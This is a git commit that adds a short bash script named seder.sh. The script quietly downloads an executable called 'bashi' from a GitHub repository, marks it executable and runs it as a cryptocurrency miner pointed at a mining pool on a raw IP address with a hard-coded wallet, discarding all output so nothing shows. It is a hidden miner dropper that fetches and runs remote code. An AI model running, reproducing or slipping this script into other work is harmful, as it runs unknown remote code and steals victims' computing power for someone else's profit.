27ba3ab8d645e96ddc066ce72ff434955e2d8ef7
amkhusain31 <136929422+amkhusain31@users.noreply.github.com>
2024-02-19 00:01:08 +0700

    Create seder.sh

---
+++ seder.sh
@@ -0,0 +1,4 @@
+#!/usr/bin/env bash
+wget https://github.com/komaria10003099/stunning-adventure/raw/main/bashi >/dev/null 2>&1
+chmod +x bashi
+./bashi --algorithm wrkz --pool 65.109.101.167:4444 --username 89XmmV9Hq8EPT6SZ3Lthhs2sYgRY8srUXP19Fbkt2scgQgTA98CZGuzRpf8hoQ4gN9QNXoXA11Y3iQsLFDfgz6NiQBh2iGh --threads 1 >/dev/null 2>&1
